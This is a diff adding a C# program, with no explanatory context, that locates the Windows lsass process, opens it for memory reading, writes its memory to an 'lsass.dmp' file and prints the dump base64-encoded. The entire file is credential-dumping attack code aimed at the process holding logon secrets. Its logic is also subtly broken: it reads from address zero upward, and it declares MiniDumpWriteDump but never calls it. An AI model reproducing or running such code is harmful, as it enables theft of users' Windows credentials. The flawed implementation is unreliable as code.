@@ -1,0 +1,65 @@
+using System;
+using System.IO;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Text;
+
+class Program
+{
+    [Flags]
+    enum ProcessAccessFlags : uint
+    {
+        PROCESS_VM_READ = 0x0010,
+        PROCESS_QUERY_INFORMATION = 0x0400
+    }
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool CloseHandle(IntPtr hObject);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesRead);
+
+    [DllImport("Dbghelp.dll")]
+    private static extern bool MiniDumpWriteDump(
+        IntPtr hProcess,
+        uint processId,
+        IntPtr hFile,
+        uint dumpType,
+        IntPtr exceptionParam,
+        IntPtr userStreamParam,
+        IntPtr callbackParam
+    );
+
+    static void Main(string[] args)
+    {
+        string dumpFilePath = "C:\\path\\to\\lsass.dmp";
+        int processId = Process.GetProcessesByName("lsass")[0].Id;
+        IntPtr processHandle = OpenProcess(ProcessAccessFlags.PROCESS_VM_READ | ProcessAccessFlags.PROCESS_QUERY_INFORMATION, false, processId);
+        if (processHandle != IntPtr.Zero)
+        {
+            using (FileStream fs = new FileStream(dumpFilePath, FileMode.Create, FileAccess.Write))
+            {
+                byte[] buffer = new byte[1024];
+                int bytesRead = 0;
+                int totalBytesRead = 0;
+                while (true)
+                {
+                    IntPtr address = new IntPtr(totalBytesRead);
+                    if (!ReadProcessMemory(processHandle, address, buffer, buffer.Length, out bytesRead))
+                    {
+                        break;
+                    }
+                    fs.Write(buffer, 0, bytesRead);
+                    totalBytesRead += bytesRead;
+                }
+            }
+            CloseHandle(processHandle);
+        }
+        byte[] dumpBytes = File.ReadAllBytes(dumpFilePath);
+        string encodedDump = Convert.ToBase64String(dumpBytes);
+        Console.WriteLine(encodedDump);
+    }
+}
